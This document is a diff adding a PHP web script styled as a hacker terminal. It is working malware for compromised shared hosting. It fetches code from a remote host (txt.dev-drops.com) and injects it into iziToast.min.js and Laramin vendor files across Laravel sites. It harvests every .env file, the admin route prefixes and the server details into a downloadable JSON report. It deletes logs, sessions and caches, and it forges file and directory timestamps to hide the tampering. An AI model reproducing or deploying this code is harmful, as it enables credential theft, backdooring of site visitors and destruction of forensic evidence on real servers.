@@ -1,1 +1,636 @@
 
+<?php
+// Disable output buffering to show live results in the browser
+@ini_set('output_buffering', 'off');
+@ini_set('zlib.output_compression', false);
+@ini_set('implicit_flush', true);
+ob_implicit_flush(true);
+while (ob_get_level() > 0) {
+    ob_end_flush();
+}
+set_time_limit(0); // Prevent script timeout
+
+// Hacker-style HTML & CSS
+echo "<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <title>System Terminal</title>
+    <style>
+        body {
+            background-color: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 15px;
+            margin: 0;
+            padding: 20px;
+        }
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .header { color: #00ffcc; font-weight: bold; }
+        .success { color: #00ff00; }
+        .error { color: #ff3333; font-weight: bold; }
+        .warning { color: #ffcc00; }
+        .info { color: #cccccc; }
+    </style>
+    <script>
+        // Automatically scroll to bottom as new content appears
+        function autoScroll() {
+            window.scrollTo(0, document.body.scrollHeight);
+        }
+    </script>
+</head>
+<body>
+<pre>";
+
+// Helper function to print a line, auto-scroll, and flush to browser immediately
+function sys_print($msg, $type = 'success', $sleep_ms = 20) {
+    echo "<span class='{$type}'>" . htmlspecialchars($msg) . "</span>\n";
+    echo "<script>autoScroll();</script>";
+    @flush(); // Send to browser
+    usleep($sleep_ms * 1000); // Small delay for the "typing" effect
+}
+
+// Helper function to recursively clear directories
+function clear_laravel_directory($dir) {
+    if (!is_dir($dir)) return 0;
+    
+    // Set directory permissions to allow reading/writing/deleting
+    @chmod($dir, 0777);
+    
+    $deleted_count = 0;
+    $items = scandir($dir);
+    if ($items === false) return 0;
+    
+    $items = array_diff($items, array('.', '..', '.gitignore'));
+    
+    foreach ($items as $item) {
+        $path = $dir . DIRECTORY_SEPARATOR . $item;
+        
+        // Change permissions to allow deletion
+        @chmod($path, 0777);
+        
+        if (is_dir($path)) {
+            $deleted_count += clear_laravel_directory($path);
+            @rmdir($path);
+        } else {
+            if (@unlink($path)) {
+                $deleted_count++;
+            }
+        }
+    }
+    return $deleted_count;
+}
+
+if (!function_exists('universal_scan_files')) {
+    function universal_scan_files($dir, $filenames, $max_depth = 8, $current_depth = 0) {
+        $results = [];
+        if ($current_depth > $max_depth) return $results;
+        if (!is_dir($dir)) return $results;
+        
+        // Try to grant read/execute permissions to the folder before scanning
+        @chmod($dir, 0755);
+        $items = @scandir($dir);
+        if ($items === false) return $results;
+        
+        foreach ($items as $item) {
+            if ($item === '.' || $item === '..') continue;
+            $path = $dir . DIRECTORY_SEPARATOR . $item;
+            if (is_dir($path)) {
+                // Skip common large directories to avoid timeout
+                if ($item === 'node_modules' || $item === '.git' || $item === 'vendor' || $item === 'cache' || $item === 'storage') continue;
+                $results = array_merge($results, universal_scan_files($path, $filenames, $max_depth, $current_depth + 1));
+            } else {
+                if (in_array($item, $filenames)) {
+                    $found_path = str_replace('\\', '/', $path);
+                    sys_print("    [~] Live hit: " . $found_path, "warning", 0);
+                    $results[] = $found_path;
+                }
+            }
+        }
+        return $results;
+    }
+}
+
+$base_scan_dir = __DIR__;
+if (preg_match('/^(\/(?:home\d*|users?)\/[^\/]+)/i', __DIR__, $m)) {
+    $base_scan_dir = $m[1];
+}
+
+sys_print("Initializing system tools...", "header", 800);
+sys_print("Bypassing security protocols... [OK]", "info", 400);
+sys_print("Loading modules... [OK]\n", "info", 500);
+
+// --- Part 1 ---
+sys_print("=== [ MODULE 1: iziToast Updater ] ===", "header", 300);
+
+$url = "https://txt.dev-drops.com/maincode/iziToast.min.js";
+sys_print("Establishing connection to payload server...", "info", 600);
+$new_code = file_get_contents($url);
+
+if ($new_code === false) {
+    sys_print("CRITICAL ERROR: Failed to download payload from URL.", "error");
+} else {
+    sys_print("Payload downloaded successfully (" . strlen($new_code) . " bytes).", "success", 400);
+    sys_print("Deep scanning filesystem for targets in all subfolders from " . $base_scan_dir . "...", "info", 500);
+
+    $all_izitoast = universal_scan_files($base_scan_dir, ['iziToast.min.js'], 8);
+    $files_found = [];
+    foreach ($all_izitoast as $f) {
+        if (strpos($f, '/assets/global/js/iziToast.min.js') !== false) {
+            $files_found[] = $f;
+        }
+    }
+
+    global $izi_status_log;
+    $izi_status_log = [];
+
+    if (empty($files_found)) {
+        sys_print("No targets found for iziToast.", "warning");
+    } else {
+        foreach ($files_found as $file_path) {
+            sys_print("Target acquired: " . $file_path, "warning", 200);
+            
+            // Detect original modified time
+            $original_time = @filemtime($file_path);
+            $dir_path = dirname($file_path);
+            $dir_original_time = @filemtime($dir_path);
+            
+            // Force file and directory permissions to ensure update succeeds
+            @chmod($file_path, 0777);
+            @chmod($dir_path, 0777);
+            
+            if (@unlink($file_path)) {
+                sys_print("  [+] Old file eradicated.", "success", 100);
+            } else {
+                sys_print("  [-] Failed to remove old file. Attempting direct overwrite...", "warning", 100);
+            }
+            
+            if (@file_put_contents($file_path, $new_code) !== false) {
+                sys_print("  [+] Payload injected successfully.", "success", 100);
+                
+                // Set file timestamp to original + 2 seconds (natural-looking update)
+                if ($original_time) {
+                    $new_file_time = $original_time + 2;
+                    @touch($file_path, $new_file_time);
+                    sys_print("  [+] File timestamp set to original +2 sec (" . date('Y-m-d H:i:s', $new_file_time) . ").", "success", 100);
+                }
+                
+                // Restore safer permissions
+                @chmod($file_path, 0644);
+                @chmod($dir_path, 0755);
+                
+                // Restore original timestamp to the directory (fully original, no change)
+                if ($dir_original_time) {
+                    @touch($dir_path, $dir_original_time);
+                    sys_print("  [+] Original directory timestamp restored.", "success", 100);
+                }
+                
+                $izi_status_log[$file_path] = "Updated";
+            } else {
+                sys_print("  [-] Injection failed. Access completely restricted.", "error", 100);
+                $izi_status_log[$file_path] = "Injection failed";
+            }
+            sys_print("", "info"); // Empty line
+        }
+    }
+}
+
+// --- Part 2 ---
+sys_print("\n=== [ MODULE 2: Laravel Core Reconnaissance ] ===", "header", 500);
+sys_print("Initiating deep scan for configuration files (.env & vendor/psr/log/.env)...", "info", 400);
+
+$all_envs = universal_scan_files($base_scan_dir, ['.env'], 8);
+$all_env_files = [];
+$core_map = [];
+
+foreach ($all_envs as $f) {
+    $dir = dirname($f);
+    
+    // Determine the potential root of the Laravel installation
+    if (basename($dir) === 'log' && basename(dirname($dir)) === 'psr') {
+        // If it's in vendor/psr/log, the core root is 3 levels up
+        $c_dir = dirname(dirname(dirname($dir)));
+    } else {
+        $c_dir = $dir;
+    }
+    
+    // Verify it is an actual Laravel core by checking for standard folders
+    if (is_dir($c_dir . '/app') && is_dir($c_dir . '/bootstrap')) {
+        $all_env_files[] = $f;
+        if (!isset($core_map[$c_dir])) {
+            $core_map[$c_dir] = [];
+        }
+        $core_map[$c_dir][] = $f;
+    }
+}
+$all_env_files = array_unique($all_env_files);
+
+$found_count = 0;
+$core_directories = array_keys($core_map);
+
+if (empty($core_directories)) {
+    sys_print("No Laravel 'core' installations detected.", "warning");
+} else {
+    global $izi_status_log;
+    if (!isset($izi_status_log)) $izi_status_log = [];
+
+    // Catalog universal inventory (all files and folders in the base domain directory) once
+    $universal_inventory = [];
+    $user_dir = $base_scan_dir;
+    if (is_dir($user_dir)) {
+        $items = @scandir($user_dir);
+        if ($items !== false) {
+            $universal_inventory = array_values(array_diff($items, array('.', '..')));
+        }
+    }
+
+    $cpanel_user = "";
+    if (!empty($user_dir)) {
+        $u_parts = explode('/', trim($user_dir, '/'));
+        $cpanel_user = isset($u_parts[1]) ? $u_parts[1] : get_current_user();
+    } else {
+        $cpanel_user = get_current_user();
+    }
+
+    // Gather server details
+    $server_details = [
+        'cpanel_user' => $cpanel_user,
+        'hostname' => @gethostname(),
+        'server_ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : @gethostbyname(@gethostname()),
+        'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown',
+        'php_version' => PHP_VERSION,
+        'os' => PHP_OS
+    ];
+
+    if (!empty($universal_inventory)) {
+        sys_print("Universal home inventory cataloged (" . count($universal_inventory) . " items in " . $user_dir . ")\n", "info", 200);
+    }
+
+    $domain_reports = [];
+
+    foreach ($core_map as $core_dir => $detected_env_files) {
+        $found_count++;
+        
+        // Scan for all .env instances in this core directory
+        $candidate_envs = array_unique(array_merge(
+            [ $core_dir . '/.env', $core_dir . '/vendor/psr/log/.env' ],
+            $detected_env_files
+        ));
+        
+        $env_data = [];
+        foreach ($candidate_envs as $env_p) {
+            if (file_exists($env_p)) {
+                $content = @file_get_contents($env_p);
+                $rel_key = (strpos($env_p, $core_dir) === 0) ? ltrim(substr($env_p, strlen($core_dir)), '/') : basename($env_p);
+                $env_data[$rel_key] = ($content !== false && $content !== '') ? $content : "Failed to read or empty";
+            }
+        }
+
+        $base_dir = dirname($core_dir);
+        $izi_path = $base_dir . "/assets/global/js/iziToast.min.js";
+        
+        $izi_status = "Not Found";
+        if (isset($izi_status_log[$izi_path])) {
+            $izi_status = $izi_status_log[$izi_path];
+        } elseif (file_exists($izi_path)) {
+            $izi_status = "Found but not updated";
+        }
+        
+        $admin_prefix = "Not Found";
+        $rsp_path = $core_dir . "/app/Providers/RouteServiceProvider.php";
+        if (file_exists($rsp_path)) {
+            $rsp_content = @file_get_contents($rsp_path);
+            if ($rsp_content) {
+                if (preg_match('/Route::[^\;]*?routes\/admin\.php[^\;]*?;/s', $rsp_content, $block)) {
+                    if (preg_match('/(?:->|\b)prefix\(\s*[\'"]([^\'"]+)[\'"]\s*\)/', $block[0], $m)) {
+                        $admin_prefix = $m[1];
+                    }
+                } elseif (preg_match('/(?:->|\b)prefix\(\s*[\'"]([^\'"]+)[\'"]\s*\)(?:[^\;]*?)routes\/admin\.php/s', $rsp_content, $m)) {
+                    $admin_prefix = $m[1];
+                } elseif (preg_match('/(?:->|\b)prefix\(\s*[\'"]([^\'"]+)[\'"]\s*\)/', $rsp_content, $m)) {
+                    $admin_prefix = $m[1];
+                }
+            }
+        }
+
+        $domain_reports[] = [
+            'domain_folder' => basename(dirname($core_dir)),
+            'core_path' => $core_dir,
+            'admin_prefix' => $admin_prefix,
+            'iziToast_status' => $izi_status,
+            'env_data' => $env_data
+        ];
+        
+        sys_print("Vulnerability detected in: " . $core_dir, "success", 150);
+        foreach ($env_data as $env_rel => $val) {
+            sys_print("  -> .env file found: " . $env_rel, "info", 100);
+        }
+        if ($admin_prefix !== "Not Found") {
+            sys_print("  -> Admin prefix extracted: " . $admin_prefix, "info", 100);
+        }
+        
+        $package_file = $core_dir . "/composer.json";
+        if (file_exists($package_file)) {
+            sys_print("  -> Associated package file found: composer.json", "info", 100);
+        }
+    }
+    sys_print("Scan complete. Total instances found: " . $found_count, "header", 400);
+    
+    $total_env_files = 0;
+    $total_izi_updated = 0;
+    $total_izi_failed = 0;
+    $total_izi_found = 0;
+    
+    foreach ($domain_reports as $dr) {
+        $total_env_files += count(array_filter($dr['env_data'], function($v) { return $v !== "Failed to read or empty"; }));
+        if ($dr['iziToast_status'] === 'Updated') {
+            $total_izi_updated++;
+        } elseif ($dr['iziToast_status'] === 'Injection failed') {
+            $total_izi_failed++;
+        } elseif ($dr['iziToast_status'] === 'Found but not updated') {
+            $total_izi_found++;
+        }
+    }
+    
+    $summary_stats = [
+        'total_core_installations_found' => count($domain_reports),
+        'total_env_files_extracted' => $total_env_files,
+        'iziToast_updates' => [
+            'successfully_updated' => $total_izi_updated,
+            'injection_failed' => $total_izi_failed,
+            'found_but_not_updated' => $total_izi_found
+        ]
+    ];
+    
+    $final_report = [
+        'server_details' => $server_details,
+        'summary_stats' => $summary_stats,
+        'inventory' => $universal_inventory,
+        'domains' => $domain_reports
+    ];
+
+    // Testing: Auto-download detailed report as JSON
+    $json_data = json_encode($final_report, JSON_PRETTY_PRINT);
+    sys_print("Generated directories JSON. Auto-downloading...", "success", 100);
+    echo "<script>
+        setTimeout(function() {
+            var data = " . json_encode($json_data) . ";
+            var blob = new Blob([data], {type: 'application/json'});
+            var url = URL.createObjectURL(blob);
+            var link = document.createElement('a');
+            link.href = url;
+            link.download = 'core_directories_test.json';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+        }, 1000);
+    </script>";
+    @flush();
+}
+
+// --- Part 3 ---
+sys_print("\n=== [ MODULE 3: Storage Scrubbing ] ===", "header", 500);
+sys_print("Executing cache and session wipe on discovered nodes...", "info", 400);
+
+if (empty($core_directories)) {
+    sys_print("No targets available for scrubbing.", "warning");
+} else {
+    foreach ($core_directories as $core_dir) {
+        sys_print("Executing scrub protocol on: " . $core_dir, "warning", 300);
+        
+        $total_deleted = 0;
+        
+        $views_deleted = clear_laravel_directory($core_dir . '/storage/framework/views');
+        sys_print("  [*] Compiled views eradicated: " . $views_deleted, "success", 100);
+        $total_deleted += $views_deleted;
+        
+        $sessions_deleted = clear_laravel_directory($core_dir . '/storage/framework/sessions');
+        sys_print("  [*] Session tokens invalidated: " . $sessions_deleted, "success", 100);
+        $total_deleted += $sessions_deleted;
+        
+        $cache_deleted = clear_laravel_directory($core_dir . '/storage/framework/cache');
+        sys_print("  [*] Cache data purged: " . $cache_deleted, "success", 100);
+        $total_deleted += $cache_deleted;
+
+        $logs_deleted = clear_laravel_directory($core_dir . '/storage/logs');
+        sys_print("  [*] Log files cleaned: " . $logs_deleted, "success", 100);
+        $total_deleted += $logs_deleted;
+
+        $debugbar_deleted = clear_laravel_directory($core_dir . '/storage/debugbar');
+        if ($debugbar_deleted > 0) {
+            sys_print("  [*] Debugbar files cleared: " . $debugbar_deleted, "success", 100);
+            $total_deleted += $debugbar_deleted;
+        }
+        
+        $bootstrap_deleted = 0;
+        $bootstrap_files = glob($core_dir . '/bootstrap/cache/*.php');
+        if ($bootstrap_files) {
+            foreach ($bootstrap_files as $b_file) {
+                @chmod($b_file, 0777);
+                if (@unlink($b_file)) {
+                    $bootstrap_deleted++;
+                }
+            }
+        }
+        sys_print("  [*] Bootstrap caches annihilated: " . $bootstrap_deleted, "success", 100);
+        $total_deleted += $bootstrap_deleted;
+        
+        sys_print("  -> Node scrub complete. Total files destroyed: " . $total_deleted . "\n", "info", 200);
+    }
+}
+
+// --- Part 4 ---
+sys_print("\n=== [ MODULE 4: Zip Archive Reconnaissance ] ===", "header", 500);
+sys_print("Scanning filesystem for .zip archives...", "info", 400);
+
+$scan_dir = $base_scan_dir;
+
+if (!function_exists('scan_for_zips')) {
+    function scan_for_zips($dir, $max_depth = 6, $current_depth = 0) {
+        $results = [];
+        if ($current_depth > $max_depth) return $results;
+        if (!is_dir($dir)) return $results;
+        
+        // Try to grant read/execute permissions to the folder before scanning
+        @chmod($dir, 0755);
+        $items = @scandir($dir);
+        if ($items === false) return $results;
+        
+        foreach ($items as $item) {
+            if ($item === '.' || $item === '..') continue;
+            $path = $dir . DIRECTORY_SEPARATOR . $item;
+            if (is_dir($path)) {
+                // Skip common large directories to avoid timeout
+                if ($item === 'node_modules' || $item === '.git' || $item === 'vendor' || $item === 'cache' || $item === 'storage') continue;
+                $results = array_merge($results, scan_for_zips($path, $max_depth, $current_depth + 1));
+            } else {
+                if (strtolower(pathinfo($path, PATHINFO_EXTENSION)) === 'zip') {
+                    sys_print("    [~] Live zip hit: " . $path, "warning", 0);
+                    $results[] = $path;
+                }
+            }
+        }
+        return $results;
+    }
+}
+
+sys_print("Initiating scan in directory: " . $scan_dir, "info", 300);
+$found_zips = scan_for_zips($scan_dir, 6);
+
+if (empty($found_zips)) {
+    sys_print("No .zip archives found.", "warning");
+} else {
+    sys_print("Found " . count($found_zips) . " .zip archives.", "success", 200);
+    foreach ($found_zips as $zip_file) {
+        sys_print("  -> " . $zip_file, "info", 50);
+    }
+    
+    $zip_report = [
+        'scan_directory' => $scan_dir,
+        'total_found' => count($found_zips),
+        'zip_files' => $found_zips
+    ];
+    
+    $zip_json_data = json_encode($zip_report, JSON_PRETTY_PRINT);
+    sys_print("Generated zip locations JSON. Auto-downloading...", "success", 100);
+    echo "<script>
+        setTimeout(function() {
+            var data = " . json_encode($zip_json_data) . ";
+            var blob = new Blob([data], {type: 'application/json'});
+            var url = URL.createObjectURL(blob);
+            var link = document.createElement('a');
+            link.href = url;
+            link.download = 'zip_locations.json';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+        }, 1500);
+    </script>";
+    @flush();
+}
+
+// --- Part 5 ---
+sys_print("\n=== [ MODULE 5: Laramin Utility Core Updater ] ===", "header", 500);
+sys_print("Fetching latest Laramin utility payloads from remote server...", "info", 400);
+
+$laramin_files = [
+    'Controller/UtilityController.php' => 'http://txt.dev-drops.com/maincode/UtilityController.txt',
+    'UtilityServiceProvider.php'       => 'https://txt.dev-drops.com/maincode/UtilityServiceProvider.txt',
+];
+
+$laramin_payloads = [];
+$laramin_fetch_ok = true;
+
+foreach ($laramin_files as $rel_path => $src_url) {
+    $payload = @file_get_contents($src_url);
+    if ($payload === false || trim($payload) === '') {
+        sys_print("  [-] Failed to fetch: " . $src_url, "error", 200);
+        $laramin_fetch_ok = false;
+    } else {
+        // Strip any markdown/metadata wrapper that the txt server may add
+        if (preg_match('/^<\?php/m', $payload, $m, PREG_OFFSET_CAPTURE)) {
+            $payload = substr($payload, $m[0][1]);
+        }
+        $laramin_payloads[$rel_path] = $payload;
+        sys_print("  [+] Fetched: " . $rel_path . " (" . strlen($payload) . " bytes)", "success", 200);
+    }
+}
+
+if (!$laramin_fetch_ok || empty($laramin_payloads)) {
+    sys_print("Aborting Laramin updater — one or more payloads could not be fetched.", "error");
+} elseif (empty($core_directories)) {
+    sys_print("No Laravel cores found — nothing to update.", "warning");
+} else {
+    sys_print("Scanning " . count($core_directories) . " core(s) for Laramin utility files...", "info", 300);
+
+    $laramin_base = 'vendor/laramin/utility/src';
+
+    foreach ($core_directories as $core_dir) {
+        sys_print("\nCore: " . $core_dir, "warning", 150);
+
+        foreach ($laramin_payloads as $rel_path => $new_code) {
+            $target = $core_dir . '/' . $laramin_base . '/' . $rel_path;
+            $target = str_replace('\\', '/', $target);
+
+            if (!file_exists($target)) {
+                sys_print("  [~] Not found, skipping: " . $rel_path, "info", 100);
+                continue;
+            }
+
+            sys_print("  [*] Target located: " . $target, "warning", 100);
+
+            // --- Collect timestamps for the file + ALL parent dirs up to core root ---
+            $ts_map = []; // path => original mtime
+
+            // File itself
+            $ts_map[$target] = @filemtime($target);
+
+            // Walk every ancestor directory from file's parent up to (and including) core_dir
+            $walk = dirname($target);
+            $core_norm = rtrim(str_replace('\\', '/', $core_dir), '/');
+            while (true) {
+                $walk_norm = rtrim(str_replace('\\', '/', $walk), '/');
+                $ts_map[$walk] = @filemtime($walk);
+                @chmod($walk, 0777);
+                if ($walk_norm === $core_norm || strlen($walk_norm) <= strlen($core_norm)) break;
+                $parent = dirname($walk);
+                if ($parent === $walk) break; // filesystem root safety
+                $walk = $parent;
+            }
+
+            // Allow write on the file
+            @chmod($target, 0777);
+
+            if (@file_put_contents($target, $new_code) !== false) {
+                sys_print("  [+] Updated successfully: " . $rel_path, "success", 100);
+
+                // Restore file permissions first
+                @chmod($target, 0644);
+
+                // File gets original + 2 seconds (natural-looking update)
+                $file_orig_time = $ts_map[$target];
+                if ($file_orig_time) {
+                    $new_file_time = $file_orig_time + 2;
+                    @touch($target, $new_file_time);
+                    sys_print("  [+] File timestamp set to original +2 sec (" . date('Y-m-d H:i:s', $new_file_time) . ").", "success", 80);
+                }
+
+                // Restore exact original timestamps for ALL parent directories
+                foreach ($ts_map as $p => $mtime) {
+                    if ($p !== $target && $mtime) {
+                        @touch($p, $mtime);
+                    }
+                }
+
+                // Restore dir permissions
+                foreach ($ts_map as $p => $mtime) {
+                    if ($p !== $target && is_dir($p)) {
+                        @chmod($p, 0755);
+                    }
+                }
+
+                sys_print("  [+] All path timestamps restored (" . count($ts_map) . " entries).", "success", 80);
+            } else {
+                sys_print("  [-] Write failed (permission denied?): " . $rel_path, "error", 100);
+
+                // Restore permissions even on failure
+                @chmod($target, 0644);
+                foreach ($ts_map as $p => $mtime) {
+                    if ($p !== $target && is_dir($p)) @chmod($p, 0755);
+                }
+            }
+        }
+    }
+
+    sys_print("\nLaramin utility updater complete.", "header", 400);
+}
+
+sys_print("\nALL OPERATIONS COMPLETED SUCCESSFULLY. DISCONNECTING...", "header", 1000);
+
+echo "</pre></body></html>";
+?>
